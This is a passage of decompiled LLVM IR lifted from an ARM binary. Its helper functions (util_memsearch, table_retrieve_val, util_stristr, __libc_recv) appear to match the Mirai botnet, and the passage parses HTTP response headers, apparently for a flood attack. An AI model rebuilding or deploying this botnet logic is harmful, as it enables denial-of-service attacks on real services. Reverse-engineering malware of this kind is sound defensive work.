  %v1_96b0 = trunc i32 %v0_96b0 to i8
  %v2_96b0 = load i32, i32* @sl, align 4
  %v3_96b0 = add i32 %v2_96b0, -1448
  %v4_96b0 = inttoptr i32 %v3_96b0 to i8*
  store i8 %v1_96b0, i8* %v4_96b0, align 1
  br label %dec_label_pc_8ef8

dec_label_pc_96b8:                                ; preds = %dec_label_pc_8cd8
  %v2_96b8 = inttoptr i32 %v1_8d24 to i32*
  %v3_96b8 = load i32, i32* %v2_96b8, align 4
  store i32 %v3_96b8, i32* %ip.global-to-local, align 4
  %v3_96c0 = udiv i32 %v3_96b8, 32
  store i32 %v2_8e1c, i32* %r1.global-to-local, align 4
  %v3_96c8 = mul nuw nsw i32 %v3_96c0, 4
  %v2_96cc = add i32 %v3_96c8, %v2_8e1c
  store i32 %v2_96cc, i32* %r2.global-to-local, align 4
  %v1_96d0 = add i32 %v2_96cc, -164
  %v2_96d0 = inttoptr i32 %v1_96d0 to i32*
  %v3_96d0 = load i32, i32* %v2_96d0, align 4
  %v1_96d4 = urem i32 %v3_96b8, 32
  store i32 %v1_96d4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_96dc = shl i32 1, %v1_96d4
  %v8_96dc = or i32 %v3_96d0, %v7_96dc
  store i32 %v8_96dc, i32* @r1, align 4
  %v1_96e0 = load i32, i32* @r8, align 4
  %v2_96e0 = sub i32 %v3_96b8, %v1_96e0
  %v3_96e0 = icmp uge i32 %v3_96b8, %v1_96e0
  store i1 %v3_96e0, i1* %cpsr_c.global-to-local, align 1
  %v4_96e0 = xor i32 %v1_96e0, %v3_96b8
  %v5_96e0 = xor i32 %v2_96e0, %v3_96b8
  %v6_96e0 = and i32 %v5_96e0, %v4_96e0
  %v7_96e0 = icmp slt i32 %v6_96e0, 0
  %v8_96e0 = icmp slt i32 %v2_96e0, 0
  %v9_96e0 = icmp eq i32 %v3_96b8, %v1_96e0
  store i1 %v9_96e0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_96dc, i32* %v2_96d0, align 4
  %v3_96e8 = xor i1 %v8_96e0, %v7_96e0
  %v4_96e8 = or i1 %v9_96e0, %v3_96e8
  br i1 %v4_96e8, label %dec_label_pc_8d00, label %dec_label_pc_96ec

dec_label_pc_96ec:                                ; preds = %dec_label_pc_96b8
  %v0_96ec = load i32, i32* %ip.global-to-local, align 4
  %v1_96ec = load i32, i32* %r3.global-to-local, align 4
  %v2_96ec = add i32 %v1_96ec, %v0_96ec
  store i32 %v2_96ec, i32* @r8, align 4
  br label %dec_label_pc_8e44

dec_label_pc_9734:                                ; preds = %dec_label_pc_8edc
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_973c = call i32 @util_zero(i32 %v2_8988, i32 10240)
  store i32 %v2_973c, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_9748 = load i32, i32* @sl, align 4
  %v1_9748 = add i32 %v0_9748, -1452
  %v2_9748 = inttoptr i32 %v1_9748 to i32*
  %v3_9748 = load i32, i32* %v2_9748, align 4
  store i32 %v3_9748, i32* %r0.global-to-local, align 4
  store i32 %v2_8988, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v4_9754 = call i32 @__libc_recv(i32 %v3_9748, i32 %v2_8988, i32 10240, i32 16386)
  store i32 %v4_9754, i32* %r0.global-to-local, align 4
  store i32 %v4_9754, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_975c = icmp eq i32 %v4_9754, 0
  store i1 %v2_975c, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r7, align 4
  %tmp181 = icmp slt i32 %v4_9754, 1
  br i1 %tmp181, label %dec_label_pc_9c5c, label %dec_label_pc_9768

dec_label_pc_9768:                                ; preds = %dec_label_pc_9734
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  store i32 %v4_9754, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b3d0.77 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_9778 = call i32 @util_memsearch(i32 %v2_8988, i32 %v4_9754, i32 ptrtoint ([5 x i8]* @global_var_1b3d0.77 to i32), i32 4)
  store i32 %v5_9778, i32* %r0.global-to-local, align 4
  %v3_977c = icmp eq i32 %v5_9778, -1
  store i1 %v3_977c, i1* %cpsr_c.global-to-local, align 1
  %v8_977c = icmp eq i32 %v5_9778, -1
  store i1 %v8_977c, i1* %cpsr_z.global-to-local, align 1
  %v0_9784 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v3_977c, label %dec_label_pc_9784, label %dec_label_pc_978c

dec_label_pc_9784:                                ; preds = %dec_label_pc_9768
  %v3_9784 = icmp ugt i32 %v0_9784, 10239
  store i1 %v3_9784, i1* %cpsr_c.global-to-local, align 1
  %v8_9784 = icmp eq i32 %v0_9784, 10240
  store i1 %v8_9784, i1* %cpsr_z.global-to-local, align 1
  %v5_9788 = icmp slt i32 %v0_9784, 10240
  br i1 %v5_9788, label %dec_label_pc_8ef8, label %dec_label_pc_978c

dec_label_pc_978c:                                ; preds = %dec_label_pc_9768, %dec_label_pc_9784
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b3d0.77 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_9784, i32* %r1.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v5_979c = call i32 @util_memsearch(i32 %v2_8988, i32 %v0_9784, i32 ptrtoint ([5 x i8]* @global_var_1b3d0.77 to i32), i32 4)
  store i32 %v2_8988, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v4_97a8 = add i32 %v5_979c, %v2_8988
  %v5_97a8 = inttoptr i32 %v4_97a8 to i8*
  store i8 0, i8* %v5_97a8, align 1
  %v0_97ac = load i32, i32* @r5, align 4
  store i32 %v0_97ac, i32* %r1.global-to-local, align 4
  store i32 53, i32* %r0.global-to-local, align 4
  %v2_97b4 = inttoptr i32 %v0_97ac to i32*
  %v3_97b4 = call i32 @table_retrieve_val(i32 53, i32* %v2_97b4)
  %v0_97b8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_97b8, i32* @r1, align 4
  store i32 %v3_97b4, i32* %r2.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v4_97c4 = call i32 @util_stristr(i8* %tmp168, i32 %v0_97b8, i32 %v3_97b4)
  store i32 %v4_97c4, i32* %r0.global-to-local, align 4
  %v2_97c8 = icmp eq i32 %v4_97c4, -1
  store i1 %v2_97c8, i1* %cpsr_c.global-to-local, align 1
  %v7_97c8 = icmp eq i32 %v4_97c4, -1
  store i1 %v7_97c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97c8, label %.thread23, label %bb182

bb182:                                            ; preds = %dec_label_pc_978c
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_97d0 = load i32, i32* @sl, align 4
  %v3_97d0 = inttoptr i32 %v2_97d0 to i32*
  store i32 2, i32* %v3_97d0, align 4
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_978c, %bb182
  %v0_97d4 = load i32, i32* @r5, align 4
  store i32 %v0_97d4, i32* %r1.global-to-local, align 4
  store i32 52, i32* %r0.global-to-local, align 4
  %v2_97dc = inttoptr i32 %v0_97d4 to i32*
  %v3_97dc = call i32 @table_retrieve_val(i32 52, i32* %v2_97dc)
  %v0_97e0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_97e0, i32* @r1, align 4
  store i32 %v3_97dc, i32* %r2.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v4_97ec = call i32 @util_stristr(i8* %tmp168, i32 %v0_97e0, i32 %v3_97dc)
  store i32 %v4_97ec, i32* %r0.global-to-local, align 4
  %v2_97f0 = icmp eq i32 %v4_97ec, -1
  store i1 %v2_97f0, i1* %cpsr_c.global-to-local, align 1
  %v7_97f0 = icmp eq i32 %v4_97ec, -1
  store i1 %v7_97f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97f0, label %.thread24, label %bb183

bb183:                                            ; preds = %.thread23
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_97f8 = load i32, i32* @sl, align 4
  %v3_97f8 = inttoptr i32 %v2_97f8 to i32*
  store i32 1, i32* %v3_97f8, align 4
  br label %.thread24

.thread24:                                        ; preds = %.thread23, %bb183
  %v0_97fc = load i32, i32* @r5, align 4
  store i32 %v0_97fc, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9804 = load i32, i32* @sl, align 4
  %v2_9804 = add i32 %v1_9804, 4
  %v3_9804 = inttoptr i32 %v2_9804 to i32*
  store i32 %v0_97fc, i32* %v3_9804, align 4
  %v2_9808 = inttoptr i32 %v0_97fc to i32*
  %v3_9808 = call i32 @table_retrieve_val(i32 51, i32* %v2_9808)
  %v0_980c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_980c, i32* @r1, align 4
  store i32 %v3_9808, i32* %r2.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v4_9818 = call i32 @util_stristr(i8* %tmp168, i32 %v0_980c, i32 %v3_9808)
  store i32 %v4_9818, i32* %r0.global-to-local, align 4
  %v2_981c = icmp eq i32 %v4_9818, -1
  store i1 %v2_981c, i1* %cpsr_c.global-to-local, align 1
  %v7_981c = icmp eq i32 %v4_9818, -1
  store i1 %v7_981c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_981c, label %.thread25, label %dec_label_pc_9824

dec_label_pc_9824:                                ; preds = %.thread24
  %v0_9824 = load i32, i32* @r5, align 4
  store i32 %v0_9824, i32* %r1.global-to-local, align 4
  store i32 51, i32* %r0.global-to-local, align 4
  %v2_982c = inttoptr i32 %v0_9824 to i32*
  %v3_982c = call i32 @table_retrieve_val(i32 51, i32* %v2_982c)
  %v0_9830 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9830, i32* @r1, align 4
  store i32 %v3_982c, i32* %r2.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v4_983c = call i32 @util_stristr(i8* %tmp168, i32 %v0_9830, i32 %v3_982c)
  store i32 %v4_983c, i32* %r0.global-to-local, align 4
  store i32 %v2_8988, i32* @lr, align 4
  %v2_9844 = add i32 %v4_983c, %v2_8988
  %v3_9844 = inttoptr i32 %v2_9844 to i8*
  %v4_9844 = load i8, i8* %v3_9844, align 1
  %v2_984c = icmp ugt i8 %v4_9844, 31
  store i1 %v2_984c, i1* %cpsr_c.global-to-local, align 1
  %v7_984c = icmp eq i8 %v4_9844, 32
  store i1 %v7_984c, i1* %cpsr_z.global-to-local, align 1
  %v2_9854 = zext i1 %v7_984c to i32
  %v2_9854.v4_983c = add i32 %v2_9854, %v4_983c
  store i32 %v2_9854.v4_983c, i32* @r4, align 4
  %v2_9858 = add i32 %v2_9854.v4_983c, %v2_8988
  store i32 %v2_9858, i32* @r6, align 4
  store i32 %v2_9858, i32* %r0.global-to-local, align 4
  %v1_9860 = load i32, i32* %fp.global-to-local, align 4
  %v2_9860 = sub i32 %v1_9860, %v2_9854.v4_983c
  store i32 %v2_9860, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_986c = call i32 @util_memsearch(i32 %v2_9858, i32 %v2_9860, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2)
  store i32 %v5_986c, i32* %r0.global-to-local, align 4
  %v2_9870 = icmp eq i32 %v5_986c, -1
  store i1 %v2_9870, i1* %cpsr_c.global-to-local, align 1
  %v7_9870 = icmp eq i32 %v5_986c, -1
  store i1 %v7_9870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9870, label %.thread25, label %dec_label_pc_9878

dec_label_pc_9878:                                ; preds = %dec_label_pc_9824
  %v2_9878 = icmp ne i32 %v5_986c, 0
  store i1 %v2_9878, i1* %cpsr_c.global-to-local, align 1
  %v7_9878 = icmp eq i32 %v5_986c, 1
  store i1 %v7_9878, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8da0, i32* %r2.global-to-local, align 4
  %v7_9880 = icmp slt i32 %v5_986c, 2
  br i1 %v7_9880, label %bb185, label %bb184

bb184:                                            ; preds = %dec_label_pc_9878
  %v9_9880 = add i32 %v5_986c, -2
  store i32 %v9_9880, i32* %r0.global-to-local, align 4
  br label %bb185

bb185:                                            ; preds = %dec_label_pc_9878, %bb184
  %v1_9888 = phi i32 [ %v5_986c, %dec_label_pc_9878 ], [ %v9_9880, %bb184 ]
  store i32 %v2_8e1c, i32* %r2.global-to-local, align 4
  %v2_9888 = add i32 %v1_9888, %v2_8e1c
  %v1_988c = load i32, i32* @r4, align 4
  %v2_988c = add i32 %v2_9888, %v1_988c
  store i32 %v2_988c, i32* %r3.global-to-local, align 4
  %v0_9890 = load i32, i32* @r5, align 4
  %v1_9890 = trunc i32 %v0_9890 to i8
  %v3_9890 = load i32, i32* @r7, align 4
  %v4_9890 = add i32 %v3_9890, %v2_988c
  %v5_9890 = inttoptr i32 %v4_9890 to i8*
  store i8 %v1_9890, i8* %v5_9890, align 1
  %v0_9894 = load i32, i32* @r6, align 4
  store i32 %v0_9894, i32* %r0.global-to-local, align 4
  %v1_9898 = inttoptr i32 %v0_9894 to i8*
  %v2_9898 = call i32 @util_strlen(i8* %v1_9898)
  %v0_989c = load i32, i32* @r5, align 4
  store i32 %v0_989c, i32* %r1.global-to-local, align 4
  store i32 %v2_9898, i32* @r4, align 4
  store i32 50, i32* %r0.global-to-local, align 4
  %v2_98a8 = inttoptr i32 %v0_989c to i32*
  %v3_98a8 = call i32 @table_retrieve_val(i32 50, i32* %v2_98a8)
  %v0_98ac = load i32, i32* @r4, align 4
  store i32 %v0_98ac, i32* @r1, align 4
  store i32 %v3_98a8, i32* %r2.global-to-local, align 4
  %v0_98b4 = load i32, i32* @r6, align 4
  store i32 %v0_98b4, i32* %r0.global-to-local, align 4
  %v3_98b8 = inttoptr i32 %v0_98b4 to i8*
  %v4_98b8 = call i32 @util_stristr(i8* %v3_98b8, i32 %v0_98ac, i32 %v3_98a8)
  store i32 %v4_98b8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_98bc = icmp eq i32 %v4_98b8, 0
  store i1 %v2_98bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_98bc, label %.thread25, label %bb186

bb186:                                            ; preds = %bb185
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_98c4 = load i32, i32* @sl, align 4
  %v3_98c4 = add i32 %v2_98c4, 4
  %v4_98c4 = inttoptr i32 %v3_98c4 to i32*
  store i32 1, i32* %v4_98c4, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb185, %dec_label_pc_9824, %.thread24, %bb186
  store i32 0, i32* @r7, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_98d4 = load i32, i32* @sl, align 4
  %v2_98d4 = add i32 %v1_98d4, 8
  %v3_98d4 = inttoptr i32 %v2_98d4 to i32*
  store i32 0, i32* %v3_98d4, align 4
  %v3_98d8 = call i32 @table_retrieve_val(i32 48, i32* null)
  %v0_98dc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_98dc, i32* @r1, align 4
  store i32 %v3_98d8, i32* %r2.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v4_98e8 = call i32 @util_stristr(i8* %tmp168, i32 %v0_98dc, i32 %v3_98d8)
  store i32 %v4_98e8, i32* %r0.global-to-local, align 4
  %v2_98f0 = icmp eq i32 %v4_98e8, -1
  store i1 %v2_98f0, i1* %cpsr_c.global-to-local, align 1
  %v7_98f0 = icmp eq i32 %v4_98e8, -1
  store i1 %v7_98f0, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_98f0, label %.thread26, label %dec_label_pc_98fc

dec_label_pc_98fc:                                ; preds = %.thread25
  %v0_98fc = load i32, i32* @r7, align 4
  store i32 %v0_98fc, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_9904 = inttoptr i32 %v0_98fc to i32*
  %v3_9904 = call i32 @table_retrieve_val(i32 48, i32* %v2_9904)
  %v0_9908 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9908, i32* @r1, align 4
  store i32 %v3_9904, i32* %r2.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v4_9914 = call i32 @util_stristr(i8* %tmp168, i32 %v0_9908, i32 %v3_9904)
  store i32 %v4_9914, i32* %r0.global-to-local, align 4
  store i32 %v2_8988, i32* %ip.global-to-local, align 4
  %v2_991c = add i32 %v4_9914, %v2_8988
  %v3_991c = inttoptr i32 %v2_991c to i8*
  %v4_991c = load i8, i8* %v3_991c, align 1
  store i32 %v2_8988, i32* @lr, align 4
  %v2_9924 = icmp ugt i8 %v4_991c, 31
  store i1 %v2_9924, i1* %cpsr_c.global-to-local, align 1
  %v7_9924 = icmp eq i8 %v4_991c, 32
  store i1 %v7_9924, i1* %cpsr_z.global-to-local, align 1
  %v2_992c = zext i1 %v7_9924 to i32
  %v2_992c.v4_9914 = add i32 %v2_992c, %v4_9914
  store i32 %v2_992c.v4_9914, i32* @r4, align 4
  %v2_9930 = add i32 %v2_992c.v4_9914, %v2_8988
  store i32 %v2_9930, i32* @r5, align 4
  store i32 %v2_9930, i32* %r0.global-to-local, align 4
  %v1_9938 = load i32, i32* %fp.global-to-local, align 4
  %v2_9938 = sub i32 %v1_9938, %v2_992c.v4_9914
  store i32 %v2_9938, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9944 = call i32 @util_memsearch(i32 %v2_9930, i32 %v2_9938, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2)
  store i32 %v5_9944, i32* %r0.global-to-local, align 4
  %v2_9948 = icmp eq i32 %v5_9944, -1
  store i1 %v2_9948, i1* %cpsr_c.global-to-local, align 1
  %v7_9948 = icmp eq i32 %v5_9944, -1
  store i1 %v7_9948, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9948, label %.thread26, label %dec_label_pc_9950

dec_label_pc_9950:                                ; preds = %dec_label_pc_98fc
  %v2_9950 = icmp ne i32 %v5_9944, 0
  store i1 %v2_9950, i1* %cpsr_c.global-to-local, align 1
  %v7_9950 = icmp eq i32 %v5_9944, 1
  store i1 %v7_9950, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8da0, i32* %r1.global-to-local, align 4
  %v7_9958 = icmp slt i32 %v5_9944, 2
  br i1 %v7_9958, label %bb188, label %bb187

bb187:                                            ; preds = %dec_label_pc_9950
  %v9_9958 = add i32 %v5_9944, -2
  store i32 %v9_9958, i32* %r0.global-to-local, align 4
  br label %bb188

bb188:                                            ; preds = %dec_label_pc_9950, %bb187
  %v1_9960 = phi i32 [ %v5_9944, %dec_label_pc_9950 ], [ %v9_9958, %bb187 ]
  store i32 %v2_8e1c, i32* %r1.global-to-local, align 4
  %v2_9960 = add i32 %v1_9960, %v2_8e1c
  %v1_9964 = load i32, i32* @r4, align 4
  %v2_9964 = add i32 %v2_9960, %v1_9964
  store i32 %v2_9964, i32* %r3.global-to-local, align 4
  %v0_9968 = load i32, i32* @r7, align 4
  %v1_9968 = trunc i32 %v0_9968 to i8
  %v3_9968 = load i32, i32* @r6, align 4
  %v4_9968 = add i32 %v3_9968, %v2_9964
  %v5_9968 = inttoptr i32 %v4_9968 to i8*
  store i8 %v1_9968, i8* %v5_9968, align 1
  %v0_996c = load i32, i32* @r5, align 4
  store i32 %v0_996c, i32* %r0.global-to-local, align 4
  %v1_9970 = inttoptr i32 %v0_996c to i8*
  %v2_9970 = call i32 @util_strlen(i8* %v1_9970)
  %v0_9974 = load i32, i32* @r7, align 4
  store i32 %v0_9974, i32* %r1.global-to-local, align 4
  store i32 %v2_9970, i32* @r4, align 4
  store i32 49, i32* %r0.global-to-local, align 4
  %v2_9980 = inttoptr i32 %v0_9974 to i32*
  %v3_9980 = call i32 @table_retrieve_val(i32 49, i32* %v2_9980)
  %v0_9984 = load i32, i32* @r4, align 4
  store i32 %v0_9984, i32* @r1, align 4
  store i32 %v3_9980, i32* %r2.global-to-local, align 4
  %v0_998c = load i32, i32* @r5, align 4
  store i32 %v0_998c, i32* %r0.global-to-local, align 4
  %v3_9990 = inttoptr i32 %v0_998c to i8*
  %v4_9990 = call i32 @util_stristr(i8* %v3_9990, i32 %v0_9984, i32 %v3_9980)
  store i32 %v4_9990, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9994 = icmp eq i32 %v4_9990, 0
  store i1 %v2_9994, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9994, label %.thread26, label %bb189

bb189:                                            ; preds = %bb188
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_999c = load i32, i32* @sl, align 4
  %v3_999c = add i32 %v2_999c, 8
  %v4_999c = inttoptr i32 %v3_999c to i32*
  store i32 1, i32* %v4_999c, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb188, %dec_label_pc_98fc, %.thread25, %bb189
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_99a8 = call i32 @table_retrieve_val(i32 47, i32* null)
  %v0_99ac = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_99ac, i32* @r1, align 4
  store i32 %v3_99a8, i32* %r2.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v4_99b8 = call i32 @util_stristr(i8* %tmp168, i32 %v0_99ac, i32 %v3_99a8)
  store i32 %v4_99b8, i32* %r0.global-to-local, align 4
  %v2_99bc = icmp eq i32 %v4_99b8, -1
  store i1 %v2_99bc, i1* %cpsr_c.global-to-local, align 1
  %v7_99bc = icmp eq i32 %v4_99b8, -1
  store i1 %v7_99bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_99bc, label %.thread, label %dec_label_pc_99d4

.thread:                                          ; preds = %.thread26
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_99cc = load i32, i32* @sl, align 4
  %v3_99cc = add i32 %v2_99cc, 12
  %v4_99cc = inttoptr i32 %v3_99cc to i32*
  store i32 0, i32* %v4_99cc, align 4
  br label %dec_label_pc_9a58

dec_label_pc_99d4:                                ; preds = %.thread26
  store i32 -20773, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v3_99dc = call i32 @table_retrieve_val(i32 47, i32* null)
  %v0_99e0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_99e0, i32* @r1, align 4
  store i32 %v3_99dc, i32* %r2.global-to-local, align 4
  store i32 %v2_8988, i32* %r0.global-to-local, align 4
  %v4_99ec = call i32 @util_stristr(i8* %tmp168, i32 %v0_99e0, i32 %v3_99dc)
  store i32 %v4_99ec, i32* %r0.global-to-local, align 4
  store i32 %v2_8988, i32* %r2.global-to-local, align 4
  %v2_99f4 = add i32 %v4_99ec, %v2_8988
  %v3_99f4 = inttoptr i32 %v2_99f4 to i8*
  %v4_99f4 = load i8, i8* %v3_99f4, align 1
  %v2_99f8 = icmp ugt i8 %v4_99f4, 31
  store i1 %v2_99f8, i1* %cpsr_c.global-to-local, align 1
  %v7_99f8 = icmp eq i8 %v4_99f4, 32
  store i1 %v7_99f8, i1* %cpsr_z.global-to-local, align 1
  %v2_9a04 = zext i1 %v7_99f8 to i32
  %v2_9a04.v4_99ec = add i32 %v2_9a04, %v4_99ec
  store i32 %v2_9a04.v4_99ec, i32* @r4, align 4
  %v2_9a08 = add i32 %v2_9a04.v4_99ec, %v2_8988
  store i32 %v2_9a08, i32* @r5, align 4
  store i32 %v2_9a08, i32* %r0.global-to-local, align 4
  %v1_9a10 = load i32, i32* %fp.global-to-local, align 4
  %v2_9a10 = sub i32 %v1_9a10, %v2_9a04.v4_99ec
  store i32 %v2_9a10, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9a1c = call i32 @util_memsearch(i32 %v2_9a08, i32 %v2_9a10, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2)
  store i32 %v5_9a1c, i32* %r0.global-to-local, align 4
  %v2_9a20 = icmp eq i32 %v5_9a1c, -1
  store i1 %v2_9a20, i1* %cpsr_c.global-to-local, align 1
  %v7_9a20 = icmp eq i32 %v5_9a1c, -1
  store i1 %v7_9a20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a20, label %dec_label_pc_9a58, label %dec_label_pc_9a28

dec_label_pc_9a28:                                ; preds = %dec_label_pc_99d4
  %v2_9a28 = icmp ne i32 %v5_9a1c, 0
  store i1 %v2_9a28, i1* %cpsr_c.global-to-local, align 1
  %v7_9a28 = icmp eq i32 %v5_9a1c, 1
  store i1 %v7_9a28, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8da0, i32* %ip.global-to-local, align 4
  %v7_9a30 = icmp slt i32 %v5_9a1c, 2
  br i1 %v7_9a30, label %bb191, label %bb190

bb190:                                            ; preds = %dec_label_pc_9a28
  %v9_9a30 = add i32 %v5_9a1c, -2
  store i32 %v9_9a30, i32* %r0.global-to-local, align 4
  br label %bb191

bb191:                                            ; preds = %dec_label_pc_9a28, %bb190
  %v1_9a38 = phi i32 [ %v5_9a1c, %dec_label_pc_9a28 ], [ %v9_9a30, %bb190 ]
  store i32 %v2_8e1c, i32* %ip.global-to-local, align 4
  %v2_9a38 = add i32 %v1_9a38, %v2_8e1c
  %v1_9a3c = load i32, i32* @r4, align 4
  %v2_9a3c = add i32 %v2_9a38, %v1_9a3c
  store i32 %v2_9a3c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9a44 = load i32, i32* @r5, align 4
  store i32 %v0_9a44, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_9a4c = load i32, i32* @r6, align 4
  %v4_9a4c = add i32 %v3_9a4c, %v2_9a3c
  %v5_9a4c = inttoptr i32 %v4_9a4c to i8*
  store i8 0, i8* %v5_9a4c, align 1
  %v2_9a50 = inttoptr i32 %v0_9a44 to i8*
  %v3_9a50 = call i32 @util_atoi(i8* %v2_9a50, i32 10)
  store i32 %v3_9a50, i32* %r0.global-to-local, align 4
  %v1_9a54 = load i32, i32* @sl, align 4
  %v2_9a54 = add i32 %v1_9a54, 12
  %v3_9a54 = inttoptr i32 %v2_9a54 to i32*
  store i32 %v3_9a50, i32* %v3_9a54, align 4
  br label %dec_label_pc_9a58

dec_label_pc_9a58:                                ; preds = %.thread, %dec_label_pc_99d4, %bb191
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9a5c

dec_label_pc_9a5c:                                ; preds = %dec_label_pc_9c28, %dec_label_pc_9ba8, %dec_label_pc_9a58
  %v1_9a68 = phi i32 [ 0, %dec_label_pc_9a58 ], [ %v0_9ba8, %dec_label_pc_9ba8 ], [ %v1_9a68.pre.pre, %dec_label_pc_9c28 ]
  store i32 %v2_8988, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_9a68 = add i32 %v1_9a68, %v2_8988
  store i32 %v2_9a68, i32* @r4, align 4
  %v3_9a6c = call i32 @table_retrieve_val(i32 46, i32* null)
  %v0_9a70 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9a70, i32* @r1, align 4
  store i32 %v3_9a6c, i32* %r2.global-to-local, align 4
  %v0_9a78 = load i32, i32* @r4, align 4
  store i32 %v0_9a78, i32* %r0.global-to-local, align 4
  %v3_9a7c = inttoptr i32 %v0_9a78 to i8*
  %v4_9a7c = call i32 @util_stristr(i8* %v3_9a7c, i32 %v0_9a70, i32 %v3_9a6c)
  store i32 %v4_9a7c, i32* %r0.global-to-local, align 4
  store i32 -20773, i32* %ip.global-to-local, align 4
  %v2_9a88 = icmp eq i32 %v4_9a7c, -1
  store i1 %v2_9a88, i1* %cpsr_c.global-to-local, align 1
  %v7_9a88 = icmp eq i32 %v4_9a7c, -1
  store i1 %v7_9a88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a88, label %dec_label_pc_9c94, label %dec_label_pc_9a94

dec_label_pc_9a94:                                ; preds = %dec_label_pc_9a5c
  %v0_9a94 = load i32, i32* @sl, align 4
  %v1_9a94 = add i32 %v0_9a94, 16
  %v2_9a94 = inttoptr i32 %v1_9a94 to i32*
  %v3_9a94 = load i32, i32* %v2_9a94, align 4
  store i32 %v3_9a94, i32* %r3.global-to-local, align 4
  %v2_9a98 = icmp ugt i32 %v3_9a94, 3
  store i1 %v2_9a98, i1* %cpsr_c.global-to-local, align 1
  %v7_9a98 = icmp eq i32 %v3_9a94, 4
  store i1 %v7_9a98, i1* %cpsr_z.global-to-local, align 1
  %v8_9a9c = icmp sgt i32 %v3_9a94, 4
  br i1 %v8_9a9c, label %dec_label_pc_9c94, label %dec_label_pc_9aa0

